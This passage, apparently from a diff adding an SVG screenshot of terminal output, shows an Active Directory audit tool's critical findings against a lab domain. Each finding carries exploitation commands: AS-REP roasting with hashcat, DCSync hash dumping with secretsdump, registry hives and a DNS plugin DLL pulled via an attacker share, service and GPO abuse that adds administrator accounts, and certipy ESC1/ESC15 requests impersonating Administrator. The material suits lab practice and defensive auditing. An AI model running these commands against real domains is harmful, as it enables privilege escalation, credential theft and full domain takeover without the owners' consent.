+<text x="556.3" y="729.0" fill="#39c5cf" xml:space="preserve">asrep.hashes</text>
+<text x="658.1" y="729.0" fill="#39c5cf" xml:space="preserve">&#x27;corp.local/administrateur:P@ssw0rd!&#x27;</text>
+<text x="86.5" y="746.5" fill="#6e7681" xml:space="preserve"># Kerberos (signing-enforced DC):</text>
+<text x="102.1" y="764.0" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-getTGT</text>
+<text x="227.4" y="764.0" fill="#39c5cf" xml:space="preserve">&#x27;corp.local/administrateur:P@ssw0rd!&#x27;</text>
+<text x="525.0" y="764.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="579.8" y="764.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="673.7" y="764.0" fill="#39c5cf" xml:space="preserve">&amp;&amp;</text>
+<text x="697.2" y="764.0" fill="#39c5cf" xml:space="preserve">export</text>
+<text x="752.0" y="764.0" fill="#39c5cf" xml:space="preserve">KRB5CCNAME=administrateur.ccache</text>
+<text x="102.1" y="781.5" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-GetNPUsers</text>
+<text x="258.7" y="781.5" fill="#d29922" xml:space="preserve">-request</text>
+<text x="329.2" y="781.5" fill="#d29922" xml:space="preserve">-k</text>
+<text x="352.7" y="781.5" fill="#d29922" xml:space="preserve">-no-pass</text>
+<text x="423.2" y="781.5" fill="#d29922" xml:space="preserve">-dc-host</text>
+<text x="493.6" y="781.5" fill="#39c5cf" xml:space="preserve">DC01.corp.local</text>
+<text x="618.9" y="781.5" fill="#d29922" xml:space="preserve">-outputfile</text>
+<text x="712.9" y="781.5" fill="#39c5cf" xml:space="preserve">asrep.hashes</text>
+<text x="814.7" y="781.5" fill="#39c5cf" xml:space="preserve">&#x27;corp.local/administrateur&#x27;</text>
+<text x="86.5" y="799.0" fill="#3fb950" font-weight="bold" xml:space="preserve">hashcat</text>
+<text x="149.1" y="799.0" fill="#d29922" xml:space="preserve">-m</text>
+<text x="172.6" y="799.0" fill="#39c5cf" xml:space="preserve">18200</text>
+<text x="219.6" y="799.0" fill="#39c5cf" xml:space="preserve">asrep.hashes</text>
+<text x="321.4" y="799.0" fill="#39c5cf" xml:space="preserve">wordlist.txt</text>
+<text x="31.7" y="816.5" fill="#ff7b72" font-weight="bold" xml:space="preserve">[CRITICAL]</text>
+<text x="117.8" y="816.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Shadow-admin group &#x27;Backup Operators&#x27; has 2 member(s)</text>
+<text x="86.5" y="834.0" fill="#6e7681" xml:space="preserve">Members (2):</text>
+<text x="86.5" y="851.5" fill="#6e7681" xml:space="preserve">  • S-1-5-21-4444444444-5555555555-6666666666-1102  [FOREIGN]</text>
+<text x="86.5" y="869.0" fill="#6e7681" xml:space="preserve">  • lowpriv</text>
+<text x="86.5" y="904.0" fill="#6e7681" xml:space="preserve">Escalation: Hold SeBackupPrivilege → read protected files (SAM/SYSTEM, and the DC&#x27;s NTDS.dit via raw/VSS) remotely → offline hash extraction (DCSync-equiv).</text>
+<text x="86.5" y="921.5" fill="#6e7681" xml:space="preserve">⚠ Includes a FOREIGN (cross-domain) member → the escalation is reachable across a trust.</text>
+<text x="86.5" y="939.0" fill="#6e7681" xml:space="preserve">If you control one of the members:</text>
+<text x="102.1" y="956.5" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-reg</text>
+<text x="203.9" y="956.5" fill="#39c5cf" xml:space="preserve">&#x27;&lt;DOM&gt;/&lt;member&gt;:&lt;password&gt;&#x27;@10.10.10.10</text>
+<text x="517.1" y="956.5" fill="#39c5cf" xml:space="preserve">backup</text>
+<text x="571.9" y="956.5" fill="#d29922" xml:space="preserve">-o</text>
+<text x="595.4" y="956.5" fill="#39c5cf" xml:space="preserve">&#x27;\\&lt;ATTACKER&gt;\share&#x27;</text>
+<text x="102.1" y="974.0" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-secretsdump</text>
+<text x="266.6" y="974.0" fill="#d29922" xml:space="preserve">-sam</text>
+<text x="305.7" y="974.0" fill="#39c5cf" xml:space="preserve">SAM.save</text>
+<text x="376.2" y="974.0" fill="#d29922" xml:space="preserve">-system</text>
+<text x="438.8" y="974.0" fill="#39c5cf" xml:space="preserve">SYSTEM.save</text>
+<text x="532.8" y="974.0" fill="#39c5cf" xml:space="preserve">LOCAL</text>
+<text x="595.4" y="974.0" fill="#6e7681" xml:space="preserve"># + NTDS via the saved hives / BackupOperatorToolkit</text>
+<text x="31.7" y="991.5" fill="#ff7b72" font-weight="bold" xml:space="preserve">[CRITICAL]</text>
+<text x="117.8" y="991.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Shadow-admin group &#x27;DnsAdmins&#x27; has 1 member(s)</text>
+<text x="86.5" y="1009.0" fill="#6e7681" xml:space="preserve">Members (1):</text>
+<text x="86.5" y="1026.5" fill="#6e7681" xml:space="preserve">  • lowpriv</text>
+<text x="86.5" y="1061.5" fill="#6e7681" xml:space="preserve">Escalation: Reconfigure the DNS service (ServerLevelPluginDll) to load an arbitrary DLL → code execution as SYSTEM on the DC when the service restarts.</text>
+<text x="86.5" y="1079.0" fill="#6e7681" xml:space="preserve">If you control one of the members:</text>
+<text x="102.1" y="1096.5" fill="#6e7681" xml:space="preserve"># set the plugin DLL (UNC to an attacker share), then bounce the service:</text>
+<text x="86.5" y="1114.0" fill="#6e7681" xml:space="preserve">  dnscmd 10.10.10.10 /config /serverlevelplugindll \\&lt;ATTACKER&gt;\share\poc.dll</text>
+<text x="86.5" y="1131.5" fill="#6e7681" xml:space="preserve">  sc.exe \\10.10.10.10 stop dns &amp;&amp; sc.exe \\10.10.10.10 start dns</text>
+<text x="31.7" y="1149.0" fill="#ff7b72" font-weight="bold" xml:space="preserve">[CRITICAL]</text>
+<text x="117.8" y="1149.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Shadow-admin group &#x27;Schema Admins&#x27; has 2 member(s)</text>
+<text x="86.5" y="1166.5" fill="#6e7681" xml:space="preserve">Members (2):</text>
+<text x="86.5" y="1184.0" fill="#6e7681" xml:space="preserve">  • svc-app</text>
+<text x="86.5" y="1201.5" fill="#6e7681" xml:space="preserve">  • Administrateur</text>
+<text x="86.5" y="1236.5" fill="#6e7681" xml:space="preserve">Escalation: Modify the AD schema — e.g. alter a class defaultSecurityDescriptor so every newly created object of that class is attacker-controlled (stealth persistence). Default-empty: any member is notable.</text>
+<text x="31.7" y="1254.0" fill="#ff7b72" font-weight="bold" xml:space="preserve">[CRITICAL]</text>
+<text x="117.8" y="1254.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Shadow-admin group &#x27;Server Operators&#x27; has 1 member(s)</text>
+<text x="86.5" y="1271.5" fill="#6e7681" xml:space="preserve">Members (1):</text>
+<text x="86.5" y="1289.0" fill="#6e7681" xml:space="preserve">  • svc-app</text>
+<text x="86.5" y="1324.0" fill="#6e7681" xml:space="preserve">Escalation: Create/modify services on domain controllers → run a command as SYSTEM on a DC.</text>
+<text x="86.5" y="1341.5" fill="#6e7681" xml:space="preserve">If you control one of the members:</text>
+<text x="102.1" y="1359.0" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-services</text>
+<text x="243.1" y="1359.0" fill="#39c5cf" xml:space="preserve">&#x27;&lt;DOM&gt;/&lt;member&gt;:&lt;password&gt;&#x27;@10.10.10.10</text>
+<text x="556.3" y="1359.0" fill="#39c5cf" xml:space="preserve">create</text>
+<text x="611.1" y="1359.0" fill="#d29922" xml:space="preserve">-name</text>
+<text x="658.1" y="1359.0" fill="#39c5cf" xml:space="preserve">svc</text>
+<text x="689.4" y="1359.0" fill="#d29922" xml:space="preserve">-display</text>
+<text x="759.9" y="1359.0" fill="#39c5cf" xml:space="preserve">svc</text>
+<text x="791.2" y="1359.0" fill="#d29922" xml:space="preserve">-path</text>
+<text x="838.1" y="1359.0" fill="#39c5cf" xml:space="preserve">&#x27;C:\Windows\System32\cmd.exe /c net user x P@ss1! /add&#x27;</text>
+<text x="102.1" y="1376.5" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-services</text>
+<text x="243.1" y="1376.5" fill="#39c5cf" xml:space="preserve">&#x27;&lt;DOM&gt;/&lt;member&gt;:&lt;password&gt;&#x27;@10.10.10.10</text>
+<text x="556.3" y="1376.5" fill="#39c5cf" xml:space="preserve">start</text>
+<text x="603.2" y="1376.5" fill="#d29922" xml:space="preserve">-name</text>
+<text x="650.2" y="1376.5" fill="#39c5cf" xml:space="preserve">svc</text>
+<text x="31.7" y="1394.0" fill="#ff7b72" font-weight="bold" xml:space="preserve">[CRITICAL]</text>
+<text x="117.8" y="1394.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">GPO &#x27;Lab-DC-Hardening&#x27; is editable by a non-privileged principal</text>
+<text x="86.5" y="1411.5" fill="#6e7681" xml:space="preserve">Editable by: corp.local\lowpriv</text>
+<text x="86.5" y="1429.0" fill="#6e7681" xml:space="preserve">Linked scope: Domain Controllers OU</text>
+<text x="86.5" y="1446.5" fill="#6e7681" xml:space="preserve">A write right on the GPO = code execution on every computer/user in that scope (scheduled task / startup script / immediate task). If you control one of the principals above:</text>
+<text x="102.1" y="1464.0" fill="#6e7681" xml:space="preserve"># Linux (pyGPOAbuse) — adds a scheduled task running as SYSTEM:</text>
+<text x="102.1" y="1481.5" fill="#3fb950" font-weight="bold" xml:space="preserve">python3</text>
+<text x="164.8" y="1481.5" fill="#39c5cf" xml:space="preserve">pygpoabuse.py</text>
+<text x="274.4" y="1481.5" fill="#39c5cf" xml:space="preserve">&#x27;corp.local\administrateur:&lt;password&gt;&#x27;</text>
+<text x="579.8" y="1481.5" fill="#d29922" xml:space="preserve">-gpo-id</text>
+<text x="642.4" y="1481.5" fill="#39c5cf" xml:space="preserve">&#x27;{499860F9-95D9-4DBB-855F-772848F3B28E}&#x27;</text>
+<text x="963.4" y="1481.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="1018.2" y="1481.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="1112.2" y="1481.5" fill="#d29922" xml:space="preserve">-command</text>
+<text x="1182.7" y="1481.5" fill="#39c5cf" xml:space="preserve">&#x27;net user hacker P@ssw0rd! /add &amp;&amp; net localgroup administrators hacker /add&#x27;</text>
+<text x="102.1" y="1499.0" fill="#6e7681" xml:space="preserve"># Windows (SharpGPOAbuse):</text>
+<text x="86.5" y="1516.5" fill="#6e7681" xml:space="preserve">  SharpGPOAbuse.exe --AddComputerTask --TaskName Update --Author corp.local\administrateur --Command cmd.exe --Arguments &quot;/c net user ...&quot; --GPOName &quot;Lab-DC-Hardening&quot;</text>
+<text x="31.7" y="1534.0" fill="#ff7b72" font-weight="bold" xml:space="preserve">[CRITICAL]</text>
+<text x="117.8" y="1534.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">dMSA dMSA01$ — supersedes a PRIVILEGED account (BadSuccessor)</text>
+<text x="86.5" y="1551.5" fill="#6e7681" xml:space="preserve">This delegated MSA is linked to a privileged account via msDS-ManagedAccountPrecededByLink. Authenticating as the dMSA yields the superseded account&#x27;s privileges (its KERB key list is migrated).</text>
+<text x="102.1" y="1569.0" fill="#6e7681" xml:space="preserve"># Request a TGT for the dMSA and inspect the migrated keys:</text>
+<text x="102.1" y="1586.5" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="188.3" y="1586.5" fill="#39c5cf" xml:space="preserve">/</text>
+<text x="203.9" y="1586.5" fill="#39c5cf" xml:space="preserve">impacket</text>
+<text x="274.4" y="1586.5" fill="#39c5cf" xml:space="preserve">getTGT</text>
+<text x="329.2" y="1586.5" fill="#39c5cf" xml:space="preserve">as</text>
+<text x="352.7" y="1586.5" fill="#39c5cf" xml:space="preserve">the</text>
+<text x="384.0" y="1586.5" fill="#39c5cf" xml:space="preserve">dMSA,</text>
+<text x="431.0" y="1586.5" fill="#39c5cf" xml:space="preserve">then</text>
+<text x="470.1" y="1586.5" fill="#39c5cf" xml:space="preserve">use</text>
+<text x="501.5" y="1586.5" fill="#39c5cf" xml:space="preserve">the</text>
+<text x="532.8" y="1586.5" fill="#39c5cf" xml:space="preserve">PAC/keys.</text>
+<text x="31.7" y="1604.0" fill="#ff7b72" font-weight="bold" xml:space="preserve">[CRITICAL]</text>
+<text x="117.8" y="1604.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Foreign principal in a privileged group via external trust with partner.local</text>
+<text x="86.5" y="1621.5" fill="#6e7681" xml:space="preserve">The external SID S-1-5-21-4444444444-5555555555-6666666666-1102 via external trust with partner.local is a (transitive) member of privileged group(s): Opérateurs de sauvegarde [CRITICAL: Backup Operators].</text>
+<text x="86.5" y="1639.0" fill="#6e7681" xml:space="preserve">Compromising this principal in its home domain grants that privilege here — an often-overlooked cross-trust escalation / persistence path.</text>
+<text x="102.1" y="1656.5" fill="#6e7681" xml:space="preserve"># resolve / audit the principal from the trusted side; its RID: 1102</text>
+<text x="31.7" y="1674.0" fill="#ff7b72" font-weight="bold" xml:space="preserve">[CRITICAL]</text>
+<text x="117.8" y="1674.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Unexpected DCSync rights — 1 principal(s)</text>
+<text x="86.5" y="1691.5" fill="#6e7681" xml:space="preserve">These accounts can dump all domain hashes (DCSync attack):</text>
+<text x="86.5" y="1709.0" fill="#6e7681" xml:space="preserve">  corp.local\lowpriv (S-1-5-21-1111111111-2222222222-3333333333-1103)</text>
+<text x="86.5" y="1726.5" fill="#6e7681" xml:space="preserve">If you control one of them (or already are privileged):</text>
+<text x="86.5" y="1744.0" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-secretsdump</text>
+<text x="250.9" y="1744.0" fill="#d29922" xml:space="preserve">-just-dc</text>
+<text x="321.4" y="1744.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="376.2" y="1744.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="470.1" y="1744.0" fill="#39c5cf" xml:space="preserve">&#x27;corp.local/administrateur:P@ssw0rd!@10.10.10.10&#x27;</text>
+<text x="86.5" y="1761.5" fill="#6e7681" xml:space="preserve"># Kerberos (signing-enforced DC):</text>
+<text x="102.1" y="1779.0" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-getTGT</text>
+<text x="227.4" y="1779.0" fill="#39c5cf" xml:space="preserve">&#x27;corp.local/administrateur:P@ssw0rd!&#x27;</text>
+<text x="525.0" y="1779.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="579.8" y="1779.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="673.7" y="1779.0" fill="#39c5cf" xml:space="preserve">&amp;&amp;</text>
+<text x="697.2" y="1779.0" fill="#39c5cf" xml:space="preserve">export</text>
+<text x="752.0" y="1779.0" fill="#39c5cf" xml:space="preserve">KRB5CCNAME=administrateur.ccache</text>
+<text x="102.1" y="1796.5" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-secretsdump</text>
+<text x="266.6" y="1796.5" fill="#d29922" xml:space="preserve">-just-dc</text>
+<text x="337.0" y="1796.5" fill="#d29922" xml:space="preserve">-k</text>
+<text x="360.5" y="1796.5" fill="#d29922" xml:space="preserve">-no-pass</text>
+<text x="431.0" y="1796.5" fill="#39c5cf" xml:space="preserve">&#x27;corp.local/administrateur@DC01.corp.local&#x27;</text>
+<text x="31.7" y="1814.0" fill="#ff7b72" font-weight="bold" xml:space="preserve">[CRITICAL]</text>
+<text x="117.8" y="1814.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Windows LAPS passwords readable — 1 computer(s)</text>
+<text x="86.5" y="1831.5" fill="#6e7681" xml:space="preserve">Accounts: WEB01</text>
+<text x="31.7" y="1849.0" fill="#ff7b72" font-weight="bold" xml:space="preserve">[CRITICAL]</text>
+<text x="117.8" y="1849.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">BitLocker — 1 recovery key(s) readable</text>
+<text x="86.5" y="1866.5" fill="#6e7681" xml:space="preserve">The current identity can read BitLocker recovery passwords from AD → offline access to the encrypted volume(s):</text>
+<text x="86.5" y="1884.0" fill="#6e7681" xml:space="preserve">  - WEB01: 123456-234567-345678-456789-567890-678901-789012-890123  (GUID 75b0fb3d-44fb-4919-941e-94a5dd4dc7fd)</text>
+<text x="102.1" y="1901.5" fill="#6e7681" xml:space="preserve"># Windows: manage-bde -unlock &lt;X&gt;: -RecoveryPassword &lt;48-digit&gt;</text>
+<text x="102.1" y="1919.0" fill="#6e7681" xml:space="preserve"># Linux (image/device): dislocker -r -p&lt;48-digit&gt; -V &lt;device&gt; -- /mnt/bl &amp;&amp; mount -o loop,ro /mnt/bl/dislocker-file /mnt/clear</text>
+<text x="31.7" y="1936.5" fill="#ff7b72" font-weight="bold" xml:space="preserve">[CRITICAL]</text>
+<text x="117.8" y="1936.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">ESC1 — 3 vulnerable template(s)</text>
+<text x="86.5" y="1954.0" fill="#6e7681" xml:space="preserve">Allows requesting a certificate with an arbitrary SAN (e.g., Domain Admin UPN).</text>
+<text x="86.5" y="1971.5" fill="#6e7681" xml:space="preserve">Enrollable by a principal the current identity controls:</text>
+<text x="86.5" y="1989.0" fill="#6e7681" xml:space="preserve">  - Autorité de certification secondaire  (enrollable by: Domain Admins, Enterprise Admins)</text>
+<text x="133.4" y="2006.5" fill="#6e7681" xml:space="preserve"># Direct (RPC/DCOM — needs TCP 135 + dynamic RPC ports open to the CA):</text>
+<text x="133.4" y="2024.0" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2024.0" fill="#39c5cf" xml:space="preserve">req</text>
+<text x="250.9" y="2024.0" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="2024.0" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="493.6" y="2024.0" fill="#d29922" xml:space="preserve">-p</text>
+<text x="517.1" y="2024.0" fill="#39c5cf" xml:space="preserve">&#x27;P@ssw0rd!&#x27;</text>
+<text x="611.1" y="2024.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="665.9" y="2024.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="759.9" y="2024.0" fill="#d29922" xml:space="preserve">-ca</text>
+<text x="791.2" y="2024.0" fill="#39c5cf" xml:space="preserve">&#x27;corp-CA&#x27;</text>
+<text x="869.5" y="2024.0" fill="#d29922" xml:space="preserve">-template</text>
+<text x="947.8" y="2024.0" fill="#39c5cf" xml:space="preserve">&#x27;SubCA&#x27;</text>
+<text x="1010.4" y="2024.0" fill="#d29922" xml:space="preserve">-upn</text>
+<text x="1049.6" y="2024.0" fill="#39c5cf" xml:space="preserve">&#x27;Administrator@corp.local&#x27;</text>
+<text x="133.4" y="2041.5" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2041.5" fill="#39c5cf" xml:space="preserve">auth</text>
+<text x="258.7" y="2041.5" fill="#d29922" xml:space="preserve">-pfx</text>
+<text x="297.9" y="2041.5" fill="#39c5cf" xml:space="preserve">administrator.pfx</text>
+<text x="438.8" y="2041.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="493.6" y="2041.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="133.4" y="2059.0" fill="#6e7681" xml:space="preserve"># If RPC is filtered (&#x27;No route to host&#x27; / endpoint mapper) — use Kerberos:</text>
+<text x="133.4" y="2076.5" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-getTGT</text>
+<text x="258.7" y="2076.5" fill="#39c5cf" xml:space="preserve">corp.local/administrateur:&#x27;P@ssw0rd!&#x27;</text>
+<text x="556.3" y="2076.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="611.1" y="2076.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="133.4" y="2094.0" fill="#3fb950" font-weight="bold" xml:space="preserve">export</text>
+<text x="188.3" y="2094.0" fill="#39c5cf" xml:space="preserve">KRB5CCNAME=administrateur.ccache</text>
+<text x="133.4" y="2111.5" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2111.5" fill="#39c5cf" xml:space="preserve">req</text>
+<text x="250.9" y="2111.5" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="2111.5" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="493.6" y="2111.5" fill="#d29922" xml:space="preserve">-k</text>
+<text x="517.1" y="2111.5" fill="#d29922" xml:space="preserve">-no-pass</text>
+<text x="587.6" y="2111.5" fill="#d29922" xml:space="preserve">-target</text>
+<text x="650.2" y="2111.5" fill="#39c5cf" xml:space="preserve">&#x27;DC01.corp.local&#x27;</text>
+<text x="791.2" y="2111.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="846.0" y="2111.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="939.9" y="2111.5" fill="#d29922" xml:space="preserve">-ns</text>
+<text x="971.3" y="2111.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="1065.2" y="2111.5" fill="#d29922" xml:space="preserve">-dns-tcp</text>
+<text x="1135.7" y="2111.5" fill="#d29922" xml:space="preserve">-ca</text>
+<text x="1167.0" y="2111.5" fill="#39c5cf" xml:space="preserve">&#x27;corp-CA&#x27;</text>
+<text x="1245.3" y="2111.5" fill="#d29922" xml:space="preserve">-template</text>
+<text x="1323.6" y="2111.5" fill="#39c5cf" xml:space="preserve">&#x27;SubCA&#x27;</text>
+<text x="1386.2" y="2111.5" fill="#d29922" xml:space="preserve">-upn</text>
+<text x="1425.4" y="2111.5" fill="#39c5cf" xml:space="preserve">&#x27;Administrator@corp.local&#x27;</text>
+<text x="133.4" y="2129.0" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2129.0" fill="#39c5cf" xml:space="preserve">auth</text>
+<text x="258.7" y="2129.0" fill="#d29922" xml:space="preserve">-pfx</text>
+<text x="297.9" y="2129.0" fill="#39c5cf" xml:space="preserve">administrator.pfx</text>
+<text x="438.8" y="2129.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="493.6" y="2129.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="86.5" y="2146.5" fill="#6e7681" xml:space="preserve">  - ESC1-Test  (enrollable by: Domain Users, Domain Admins, Enterprise Admins)</text>
+<text x="133.4" y="2164.0" fill="#6e7681" xml:space="preserve"># Direct (RPC/DCOM — needs TCP 135 + dynamic RPC ports open to the CA):</text>
+<text x="133.4" y="2181.5" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2181.5" fill="#39c5cf" xml:space="preserve">req</text>
+<text x="250.9" y="2181.5" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="2181.5" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="493.6" y="2181.5" fill="#d29922" xml:space="preserve">-p</text>
+<text x="517.1" y="2181.5" fill="#39c5cf" xml:space="preserve">&#x27;P@ssw0rd!&#x27;</text>
+<text x="611.1" y="2181.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="665.9" y="2181.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="759.9" y="2181.5" fill="#d29922" xml:space="preserve">-ca</text>
+<text x="791.2" y="2181.5" fill="#39c5cf" xml:space="preserve">&#x27;corp-CA&#x27;</text>
+<text x="869.5" y="2181.5" fill="#d29922" xml:space="preserve">-template</text>
+<text x="947.8" y="2181.5" fill="#39c5cf" xml:space="preserve">&#x27;ESC1-Test&#x27;</text>
+<text x="1041.7" y="2181.5" fill="#d29922" xml:space="preserve">-upn</text>
+<text x="1080.9" y="2181.5" fill="#39c5cf" xml:space="preserve">&#x27;Administrator@corp.local&#x27;</text>
+<text x="133.4" y="2199.0" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2199.0" fill="#39c5cf" xml:space="preserve">auth</text>
+<text x="258.7" y="2199.0" fill="#d29922" xml:space="preserve">-pfx</text>
+<text x="297.9" y="2199.0" fill="#39c5cf" xml:space="preserve">administrator.pfx</text>
+<text x="438.8" y="2199.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="493.6" y="2199.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="133.4" y="2216.5" fill="#6e7681" xml:space="preserve"># If RPC is filtered (&#x27;No route to host&#x27; / endpoint mapper) — use Kerberos:</text>
+<text x="133.4" y="2234.0" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-getTGT</text>
+<text x="258.7" y="2234.0" fill="#39c5cf" xml:space="preserve">corp.local/administrateur:&#x27;P@ssw0rd!&#x27;</text>
+<text x="556.3" y="2234.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="611.1" y="2234.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="133.4" y="2251.5" fill="#3fb950" font-weight="bold" xml:space="preserve">export</text>
+<text x="188.3" y="2251.5" fill="#39c5cf" xml:space="preserve">KRB5CCNAME=administrateur.ccache</text>
+<text x="133.4" y="2269.0" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2269.0" fill="#39c5cf" xml:space="preserve">req</text>
+<text x="250.9" y="2269.0" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="2269.0" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="493.6" y="2269.0" fill="#d29922" xml:space="preserve">-k</text>
+<text x="517.1" y="2269.0" fill="#d29922" xml:space="preserve">-no-pass</text>
+<text x="587.6" y="2269.0" fill="#d29922" xml:space="preserve">-target</text>
+<text x="650.2" y="2269.0" fill="#39c5cf" xml:space="preserve">&#x27;DC01.corp.local&#x27;</text>
+<text x="791.2" y="2269.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="846.0" y="2269.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="939.9" y="2269.0" fill="#d29922" xml:space="preserve">-ns</text>
+<text x="971.3" y="2269.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="1065.2" y="2269.0" fill="#d29922" xml:space="preserve">-dns-tcp</text>
+<text x="1135.7" y="2269.0" fill="#d29922" xml:space="preserve">-ca</text>
+<text x="1167.0" y="2269.0" fill="#39c5cf" xml:space="preserve">&#x27;corp-CA&#x27;</text>
+<text x="1245.3" y="2269.0" fill="#d29922" xml:space="preserve">-template</text>
+<text x="1323.6" y="2269.0" fill="#39c5cf" xml:space="preserve">&#x27;ESC1-Test&#x27;</text>
+<text x="1417.6" y="2269.0" fill="#d29922" xml:space="preserve">-upn</text>
+<text x="1456.7" y="2269.0" fill="#39c5cf" xml:space="preserve">&#x27;Administrator@corp.local&#x27;</text>
+<text x="133.4" y="2286.5" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2286.5" fill="#39c5cf" xml:space="preserve">auth</text>
+<text x="258.7" y="2286.5" fill="#d29922" xml:space="preserve">-pfx</text>
+<text x="297.9" y="2286.5" fill="#39c5cf" xml:space="preserve">administrator.pfx</text>
+<text x="438.8" y="2286.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="493.6" y="2286.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="86.5" y="2304.0" fill="#6e7681" xml:space="preserve">  - ESC15-Test  (enrollable by: Domain Users, Domain Admins, Enterprise Admins)</text>
+<text x="133.4" y="2321.5" fill="#6e7681" xml:space="preserve"># Direct (RPC/DCOM — needs TCP 135 + dynamic RPC ports open to the CA):</text>
+<text x="133.4" y="2339.0" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2339.0" fill="#39c5cf" xml:space="preserve">req</text>
+<text x="250.9" y="2339.0" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="2339.0" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="493.6" y="2339.0" fill="#d29922" xml:space="preserve">-p</text>
+<text x="517.1" y="2339.0" fill="#39c5cf" xml:space="preserve">&#x27;P@ssw0rd!&#x27;</text>
+<text x="611.1" y="2339.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="665.9" y="2339.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="759.9" y="2339.0" fill="#d29922" xml:space="preserve">-ca</text>
+<text x="791.2" y="2339.0" fill="#39c5cf" xml:space="preserve">&#x27;corp-CA&#x27;</text>
+<text x="869.5" y="2339.0" fill="#d29922" xml:space="preserve">-template</text>
+<text x="947.8" y="2339.0" fill="#39c5cf" xml:space="preserve">&#x27;ESC15-Test&#x27;</text>
+<text x="1049.6" y="2339.0" fill="#d29922" xml:space="preserve">-upn</text>
+<text x="1088.7" y="2339.0" fill="#39c5cf" xml:space="preserve">&#x27;Administrator@corp.local&#x27;</text>
+<text x="133.4" y="2356.5" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2356.5" fill="#39c5cf" xml:space="preserve">auth</text>
+<text x="258.7" y="2356.5" fill="#d29922" xml:space="preserve">-pfx</text>
+<text x="297.9" y="2356.5" fill="#39c5cf" xml:space="preserve">administrator.pfx</text>
+<text x="438.8" y="2356.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
